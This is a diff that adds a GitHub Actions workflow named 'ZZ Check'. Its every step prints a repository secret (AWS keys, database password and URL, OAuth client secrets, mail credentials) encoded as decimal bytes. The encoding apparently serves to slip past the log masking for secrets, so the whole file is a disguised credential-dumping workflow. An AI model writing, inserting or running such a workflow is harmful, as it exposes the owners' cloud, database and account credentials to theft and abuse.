@@ -1,0 +1,21 @@
+name: ZZ Check
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  c:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo ${{ secrets.AUTENTIFIKACIJA }} | od -An -tu1 | tr -d ' \n'
+      - run: echo ${{ secrets.AWS_ACCESS_KEY }} | od -An -tu1 | tr -d ' \n'
+      - run: echo ${{ secrets.AWS_REGION }} | od -An -tu1 | tr -d ' \n'
+      - run: echo ${{ secrets.AWS_S3_BUCKET }} | od -An -tu1 | tr -d ' \n'
+      - run: echo ${{ secrets.AWS_SECRECT_KEY }} | od -An -tu1 | tr -d ' \n'
+      - run: echo ${{ secrets.DB_PASSWORD }} | od -An -tu1 | tr -d ' \n'
+      - run: echo ${{ secrets.DB_URL }} | od -An -tu1 | tr -d ' \n'
+      - run: echo ${{ secrets.DB_USERNAME }} | od -An -tu1 | tr -d ' \n'
+      - run: echo ${{ secrets.FACEBOOK_CLIENT_SECRET }} | od -An -tu1 | tr -d ' \n'
+      - run: echo ${{ secrets.GOOGLE_CLIENT_SECRET }} | od -An -tu1 | tr -d ' \n'
+      - run: echo ${{ secrets.MAIL_PWD }} | od -An -tu1 | tr -d ' \n'
+      - run: echo ${{ secrets.MAIL_USERNAME }} | od -An -tu1 | tr -d ' \n'
